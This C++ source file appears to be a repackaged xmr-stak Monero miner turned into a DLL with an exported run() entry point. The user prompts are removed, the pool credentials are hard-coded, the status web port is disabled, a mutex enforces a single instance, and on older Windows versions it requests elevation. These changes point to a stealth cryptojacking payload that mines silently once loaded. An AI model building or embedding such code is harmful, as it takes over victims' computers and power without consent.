#include "xmrstak/misc/executor.hpp"
#include "xmrstak/backend/miner_work.hpp"
#include "xmrstak/backend/globalStates.hpp"
#include "xmrstak/backend/backendConnector.hpp"
#include "xmrstak/jconf.hpp"
#include "xmrstak/misc/console.hpp"
#include "xmrstak/donate-level.hpp"
#include "xmrstak/params.hpp"
#include "xmrstak/misc/configEditor.hpp"
#include "xmrstak/version.hpp"
#include "xmrstak/misc/utility.hpp"

#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <time.h>
#include <iostream>

#ifdef _WIN32
#	define strcasecmp _stricmp
#	include <windows.h>
#	include "xmrstak/misc/uac.hpp"
#endif // _WIN32

#include "xmrstak/backend/iBackend.hpp"
#include "xmrstak/backend/backendConnector.hpp"

inline const char* bool_to_str(bool v)
{
	return v ? "true" : "false";
}


xmrstak::configEditor do_guided_pool_config()
{
	using namespace xmrstak;

	// load the template of the backend config into a char variable
	const char *tpl =
		#include "../c2"
	;

	configEditor configTpl(tpl);
	bool prompted = false;

	auto& currency = params::inst().currency;
	currency = "c21";

	auto& pool = params::inst().poolURL;
	bool userSetPool = true;

	pool = "xxxxxxxxxxxxxxxxxxxxxxxxxx:ppppp";

	auto& userName = params::inst().poolUsername;

	userName = "z";

	bool stdin_flushed = false;
	auto& passwd = params::inst().poolPasswd;
	passwd = "x";

	auto& rigid = params::inst().poolRigid;
	rigid = "";

	bool tls;
	tls = false;

	bool nicehash;
	nicehash = false;

	bool multipool;
	multipool = false;

	int64_t pool_weight;
	pool_weight = 1;

	std::string pool_table;
	pool_table += "\t{\"p1\" : \"" + pool +"\", \"p2\" : \"" + userName +  "\", \"p3\" : \"" + rigid +
		"\", \"p4\" : \"" +  passwd + "\", \"p5\" : " + bool_to_str(nicehash) + ", \"p6\" : " +
		bool_to_str(tls) + ", \"p7\" : \"\", \"p8\" : " + std::to_string(pool_weight) + " },\n";

	configTpl.replace("HOLDER1", currency);
	configTpl.replace("HOLDER2", pool_table);
	configTpl.formatConfig();
	return configTpl;
}

xmrstak::configEditor do_guided_config()
{
	using namespace xmrstak;

	// load the template of the backend config into a char variable
	const char *tpl = 
		#include "../c1"
	;

	configEditor configTpl(tpl);
	bool prompted = false;

	auto& http_port = params::inst().httpd_port;
	http_port = params::httpd_port_disabled;

	configTpl.replace("HTTP_PORT", std::to_string(http_port));
	configTpl.formatConfig();
	return configTpl;
}
extern "C" {
#ifdef _WIN32
	__declspec(dllexport)
#endif

	void run()
	{
	#ifndef CONF_NO_TLS
		SSL_library_init();
		SSL_load_error_strings();
		ERR_load_BIO_strings();
		ERR_load_crypto_strings();
		SSL_load_error_strings();
		OpenSSL_add_all_digests();
	#endif

		srand(time(0));

		using namespace xmrstak;

		HANDLE mut;
		mut = CreateMutex(NULL, FALSE, "a8a2b404-7fae-4564-a615-631bacd2d133");
		DWORD result;
		result = WaitForSingleObject(mut, 0);

		if (result != WAIT_OBJECT_0) {
			CloseHandle(mut);
			win_exit();
			return void();
		}

		// check if we need a guided start
		configEditor guidedConfig =	do_guided_config();
		configEditor guidedPoolConfig = do_guided_pool_config();

		if(!jconf::inst()->parse_configs(guidedConfig.getConfig(), guidedPoolConfig.getConfig()))
		{
			ReleaseMutex(mut);
			CloseHandle(mut);
			win_exit();
			return void();
		}

	#ifdef _WIN32
		/* For Windows 7 and 8 request elevation at all times unless we are using slow memory */
		if(jconf::inst()->GetSlowMemSetting() != jconf::slow_mem_cfg::always_use && !IsWindows10OrNewer())
		{
			RequestElevation();
		}
	#endif

		if(strlen(jconf::inst()->GetOutputFile()) != 0)
			printer::inst()->open_logfile(jconf::inst()->GetOutputFile());

		if (!BackendConnector::self_test())
		{
			ReleaseMutex(mut);
			CloseHandle(mut);
			printer::inst()->print_msg(L0, "Self test not passed!");
			win_exit();
			return void();
		}

		if(jconf::inst()->GetHttpdPort() != uint16_t(params::httpd_port_disabled))
		{
	#ifdef CONF_NO_HTTPD
			ReleaseMutex(mut);
			CloseHandle(mut);
			printer::inst()->print_msg(L0, "HTTPD port is enabled but this binary was compiled without HTTP support!");
			win_exit();
			return void();
	#else
			if (!httpd::inst()->start_daemon())
			{
				ReleaseMutex(mut);
				CloseHandle(mut);
				win_exit();
				return void();
			}
	#endif
		}

		executor::inst()->ex_start(jconf::inst()->DaemonMode());

		uint64_t lastTime = get_timestamp_ms();
		int key;
		while(true)
		{
			key = get_key();

			switch(key)
			{
			case 'h':
				executor::inst()->push_event(ex_event(EV_USR_HASHRATE));
				break;
			case 'r':
				executor::inst()->push_event(ex_event(EV_USR_RESULTS));
				break;
			case 'c':
				executor::inst()->push_event(ex_event(EV_USR_CONNSTAT));
				break;
			default:
				break;
			}

			uint64_t currentTime = get_timestamp_ms();

			/* Hard guard to make sure we never get called more than twice per second */
			if( currentTime - lastTime < 500)
				std::this_thread::sleep_for(std::chrono::milliseconds(500 - (currentTime - lastTime)));
			lastTime = currentTime;
		}
		ReleaseMutex(mut);
		CloseHandle(mut);
		return void();
	}
}
